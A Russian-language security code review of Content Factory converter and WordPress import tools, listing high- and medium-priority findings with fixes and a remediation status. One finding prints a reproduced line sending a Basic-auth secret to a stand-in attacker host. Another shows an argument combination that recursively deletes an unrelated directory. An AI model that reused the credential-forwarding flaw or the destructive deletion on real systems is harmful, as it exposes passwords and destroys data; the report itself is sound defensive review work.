## Статус устранения

Замечания устранены 26 августа 2026 года после переноса `tools` внутрь плагина Content Factory. Этот документ сохранён как исходный отчёт ревью; номера строк и описания поведения ниже относятся к состоянию до исправлений.

- P1 исключения текста: широкие префиксы заменены точным закрытым перечнем служебных заголовков; обычные `ВАЖНО…` и `КОММЕНТАР…` остаются публичными.

- Дополнительные риски: каждый Markdown читается один раз для разбора и хеша, а полный снимок дерева повторно сравнивается перед установкой результата; документация поясняет, что offline `contractHash` не доказывает подлинность.

Все перечисленные сценарии закреплены автоматическими regression-тестами. Рабочий код плагина не изменялся.

## Краткий вывод

Инструменты Content Factory хорошо защищают основной штатный сценарий: конвертация отделена от импорта, публикация недоступна, перед созданием черновиков предусмотрена повторная проверка пакета, ZIP получается детерминированным, а несовместимые ссылки и ресурсы обычно блокируют результат.

Однако блок пока нельзя считать безопасным для запуска без доработок. Обнаружены пять проблем высокого приоритета и три проблемы среднего приоритета. Наиболее опасные риски:

- передача WordPress Application Password на посторонний домен;
- удаление произвольного каталога через ошибочно заданный `--output ... --force`;
- изменение не того управляемого черновика при конфликтующих UUID;
- молчаливое удаление публичного текста;
- молчаливая потеря ссылки у CTA с одной кнопкой.

## Подтверждённые находки

### P1 — учётные данные могут быть переданы на другой домен

Файл: `content_factory_converter/http.py`, строки 48–80.

HTTP-клиент добавляет `Authorization` к запросу и использует стандартный `urllib.request.urlopen`. Стандартный обработчик перенаправлений Python переносит этот заголовок в новый запрос даже при переходе на другой хост.

Дополнительно `_discover_rest_root()` без проверки origin принимает абсолютный REST URL из HTTP-заголовка `Link` или HTML-тега `<link>`. В результате выбранный WordPress-сайт может указать REST root на посторонний домен, после чего туда будет отправлен WordPress Application Password.

Локально подтверждено:

```text
https://attacker.example/collect Basic SECRET
```

Также клиент разрешает обычный `http://` для любого хоста, поэтому пароль может передаваться без TLS. HTTP необходим для `localhost`, но не должен молча приниматься для удалённых адресов.

Рекомендации:

1. Разрешать REST root только с тем же scheme/host/port, что и исходный WordPress URL.
2. Отключить перенос `Authorization` при cross-origin redirect или полностью запретить такие перенаправления.
3. Разрешать `http://` только для loopback-адресов либо требовать отдельное явное небезопасное подтверждение.
4. Добавить тесты для cross-origin `Link`, HTML discovery и redirects.

### P1 — `--force` может удалить произвольный каталог

Файл: `content_factory_converter/converter.py`, строки 651–659 и 806–808.

Перед заменой результата конвертер вызывает `shutil.rmtree(output_root)`. Он запрещает использовать корень диска, домашний каталог и предка исходной папки, но не проверяет, действительно ли существующий каталог ранее был создан этим инструментом.

Например, следующая комбинация проходит текущую проверку пути:

```text
--source "SEO pages" --output "wordpress" --force
```

После успешной сборки временного результата существующая папка `wordpress` будет рекурсивно удалена.

Рекомендации:

1. Создавать в выходном каталоге marker-файл с версией/идентификатором инструмента.
2. При `--force` разрешать удаление только каталога с корректным marker-файлом.
3. Явно запрещать известные каталоги проекта и слишком широкие пути.
4. Перед заменой переименовывать старый результат в резервный каталог и удалять его только после успешной установки нового.
5. Добавить тест с существующим посторонним каталогом.

### P1 — конфликт UUID в метаданных и имени файла не блокируется

Файлы: `content_factory_converter/markdown.py`, строка 11; `content_factory_converter/converter.py`, строки 62–71 и 207–218.

Документация требует, чтобы UUID в метаданных совпадал с UUID непосредственно перед `.md` в имени файла. Реализация при наличии обоих значений безусловно выбирает UUID из метаданных и игнорирует расхождение.

Воспроизводящий пример вернул:

```text
metadata UUID: 11111111-1111-4111-8111-111111111111
filename UUID: 22222222-2222-4222-8222-222222222222
selected sourceId: seo-11111111-1111-4111-8111-111111111111
```

Это может направить содержимое одного документа на уже существующий управляемый черновик другого документа. Дополнительно регулярное выражение принимает UUID любой версии, хотя документированный формат — UUIDv4.

Рекомендации:

1. Извлекать оба UUID отдельно.
2. Блокировать конвертацию при их несовпадении.
3. Проверять UUIDv4 и корректный variant.
4. Добавить тесты на конфликт, неверную версию UUID и переименование файла.

### P1 — публичный раздел может быть удалён без blocking gap

Файлы: `content_factory_converter/markdown.py`, строки 18–27; `content_factory_converter/converter.py`, строки 510–514.

Любой публичный раздел, заголовок которого начинается с одного из широких префиксов, считается служебным. В перечень входят `ВАЖНО: ` и `КОММЕНТАР`.

Воспроизводящий раздел:

```md
# ВАЖНО: правила ухода

ЭТОТ ПУБЛИЧНЫЙ ТЕКСТ ДОЛЖЕН ОСТАТЬСЯ.
```

Результат проверки:

```json
{
  "status": "compatible",
  "textPreserved": false,
  "excluded": [
    {
      "kind": "service-section",
      "title": "ВАЖНО: правила ухода"
    }
  ]
}
```

Плагин не может обнаружить эту потерю: он получает уже сокращённый, но формально валидный PageSpec. Поэтому последующая runtime-валидация не компенсирует проблему.

Рекомендации:

1. Использовать однозначную служебную директиву вместо классификации по общему префиксу.
2. Пока формат не изменён, считать каждое исключение из публичной области blocking gap, требующим явного подтверждения.
3. Ввести проверку сохранности: каждое публичное содержательное значение должно быть представлено в PageSpec или отмечено как подтверждённое исключение.
4. Добавить негативные тесты с обычными пользовательскими заголовками, начинающимися с `ВАЖНО` и `КОММЕНТАРИЙ`.

### P1 — CTA с одной ссылкой молча превращается в форму

Файл: `content_factory_converter/converter.py`, строки 338–368.

Тип CTA выбирается по правилу:

```python
variant = "form" if is_form or len(actions) < 2 else "links"
```

Если в CTA указана одна кнопка с URL, но не указана форма, конвертер всё равно выбирает `form`. URL при этом не переносится в PageSpec, gap не создаётся, а пакет остаётся совместимым.

Подтверждённый результат:

```json
{
  "variant": "form",
  "primaryAction": {
    "label": "Перейти"
  }
}
```

Исходный URL `/catalog/` исчез полностью.

Рекомендации:

1. Выбирать `form` только по явному полю формы.
2. Одна кнопка с URL должна формировать `links` с одним действием, если это разрешено контрактом.
3. Если профиль не поддерживает такой вариант, создавать blocking `ADAPTER_GAP`, а не удалять URL.
4. Создавать gap для третьей и последующих кнопок вместо их молчаливого отбрасывания.

### P2 — ошибочный ответ импорта может завершить CLI кодом 0

Файл: `content_factory_converter/cli.py`, строки 103–114.

После запроса импорта CLI ищет `result.counts.failed`. Если `counts` отсутствует, используется пустой словарь, а затем значение `failed` по умолчанию становится `0`.

Ответ сервера:

```json
{
  "status": "error",
  "message": "database write failed"
}
```

дал следующий результат:

```text
status: draft-import-request-completed
exit code: 0
```

Автоматизация или оператор могут принять неуспешный импорт за успешный.

Рекомендации:

1. Проверять полную ожидаемую структуру ответа.
2. Считать отсутствие `counts.failed` ошибкой протокола.
3. Проверять итоговый статус операции и согласованность total/created/updated/no_change/failed.
4. Добавить тесты на пустой объект, `{status: error}`, отсутствующие и некорректные counts.

### P2 — два источника могут получить одинаковый итоговый путь

Файл: `content_factory_converter/converter.py`, строки 227 и 686–690.

Словари `by_declared` и `source_by_path` создаются обычными dict comprehension. Если два файла имеют одинаковый заявленный или вычисленный путь, последний источник молча заменяет предыдущий в таблице ссылок.

В негативном тесте два разных дочерних файла имели один slug. Конвертер сообщил:

```json
{
  "status": "compatible",
  "gaps": {
    "CONTENT_GAP": 0,
    "LINK_GAP": 0,
    "ASSET_GAP": 0,
    "ADAPTER_GAP": 0
  },
  "duplicateExpectedPaths": [
    "/catalog/detail/",
    "/catalog/detail/"
  ]
}
```

WordPress batch-валидатор позднее обнаружит `DUPLICATE_BATCH_PATH` и заблокирует пакет, поэтому непосредственной записи не произойдёт. Но офлайн-статус и локальное разрешение ссылок остаются неверными.

Рекомендации:

1. До построения ссылок проверять уникальность `declared_path` и `expected_path`.
2. Добавлять blocking `CONTENT_GAP` либо завершать конвертацию исключением.
3. Добавить тесты для одинаковых root slug, sibling slug и declared URL.

### P2 — локальный упаковщик не проверяет результат и сейчас использует устаревшие входные файлы

Файл: `build_local_import_pack.py`, строки 44–78.

Скрипт изменяет ссылки, создаёт ZIP и печатает успешный отчёт, но не выполняет:

- проверку текущих версий;
- JSON Schema-проверку;
- semantic validation;
- runtime `/validate`;
- фактическую проверку неизменности источников.

Поле `sourceModified` всегда равно `false` независимо от реального состояния.

На момент ревью все 49 файлов в `content-factory-json/pages` и `content-factory-json-local/pages` содержат `profileVersion: 2.0.0`. Текущий профиль проекта — `2.1.0`. Поэтому повторная сборка этим помощником создаст устаревший пакет, хотя локальный отчёт будет выглядеть успешным.

Рекомендации:

1. Вывести скрипт из эксплуатации и использовать основной contract-driven converter; либо
2. встроить version checker, текущий Contract Bundle, schema/semantic validation и обязательный `/validate`;
3. не создавать архив при нулевом количестве страниц;
4. формировать результат во временной папке и устанавливать его только после всех проверок;
5. вычислять `sourceModified`, а не записывать константу.

## Дополнительные риски

### Состояние источника может измениться в коротком окне чтения

`parse_document()` читает Markdown, после чего исходный файл повторно читается для вычисления хеша. Если файл изменится между этими двумя операциями, в память попадёт старое содержимое, а `sourceSha256` будет вычислен уже по новому. Финальная проверка может не заметить расхождение.

Новые Markdown-файлы, добавленные после первичного обхода дерева, также не учитываются финальной проверкой.

Рекомендуется один раз читать каждый файл в bytes, вычислять хеш по этим же bytes и парсить именно их. В конце следует повторно получить полный снимок списка файлов и их хешей.

### Офлайн Contract Bundle имеет проверку целостности, но не подлинности

`contractHash` подтверждает, что содержимое не изменилось относительно самого хеша. Он не является подписью: изменив bundle и пересчитав hash, можно получить формально корректный файл.

Это не даёт прямого выполнения кода, а runtime-валидация должна обнаружить несовместимую identity. Тем не менее документация не должна представлять локальный hash как доказательство происхождения bundle. Для критичного офлайн-процесса нужен доверенный канал получения или подпись.

## Что уже сделано хорошо

- Конвертация сама по себе не пишет в WordPress.
- Импорт отделён от конвертации.
- Для записи требуются `--execute` и точная подтверждающая фраза.
- Перед импортом пакет повторно проходит read-only validation.
- Сервер сверяет `validatedHash` с фактически загруженным пакетом.
- Публикация через этот CLI недоступна.
- Неизвестные ссылки и assets обычно создают blocking gaps.
- ZIP основного конвертера детерминирован.
- Выход строится во временном каталоге и устанавливается после конвертации.
- Выходной путь-символическая ссылка отклоняется.
- Текущие версии конвертера и локального плагина проверяются отдельной командой.
- Серверная batch-проверка обнаруживает повторяющийся итоговый путь, даже если локальный конвертер его пропустил.

## Рекомендуемый порядок исправлений

1. Закрыть утечку Authorization: same-origin REST discovery, безопасные redirects, HTTPS policy.
2. Сделать `--force` безопасным через marker-файл и отказ от удаления посторонних каталогов.
3. Блокировать несовпадающие UUID.
4. Исключить молчаливую потерю публичных разделов и CTA-ссылок.
5. Валидировать структуру ответа импорта перед возвратом кода 0.
6. Проверять уникальность всех итоговых путей локально.
7. Удалить или модернизировать `build_local_import_pack.py`.
8. Усилить snapshot-проверку исходного дерева.
9. Добавить adversarial regression-тесты на каждый найденный случай.

## Итоговая оценка

Текущая архитектура имеет правильное общее направление и несколько сильных серверных предохранителей. Однако локальный инструмент пока способен:

- раскрыть учётные данные;
- удалить нецелевой каталог;
- создать PageSpec не для того sourceId;
- выпустить формально совместимый пакет с потерянным публичным содержимым;
- ошибочно сообщить об успешном импорте.

До устранения P1-находок рекомендуется не использовать `--force` с существующими каталогами, не запускать CLI с Application Password через обычный HTTP или при возможных внешних перенаправлениях, вручную проверять UUID и внимательно просматривать `excludedServiceContent` перед импортом.
